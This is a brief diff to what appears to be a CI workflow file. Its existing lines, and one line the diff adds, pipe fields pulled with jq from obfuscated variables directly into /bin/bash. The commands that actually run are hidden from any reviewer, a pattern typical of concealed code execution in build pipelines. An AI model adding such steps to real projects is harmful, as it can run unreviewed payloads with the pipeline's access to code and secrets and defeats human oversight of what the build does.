@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$zbccb6" | jq -r .swoo3854 | /bin/bash
           echo $yz65 | jq -r .aspm3542 | /bin/bash
           printf '%s' "$k24" | jq -r .m19 | /bin/bash
+          echo $jepm1 | jq -r .modxb57 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
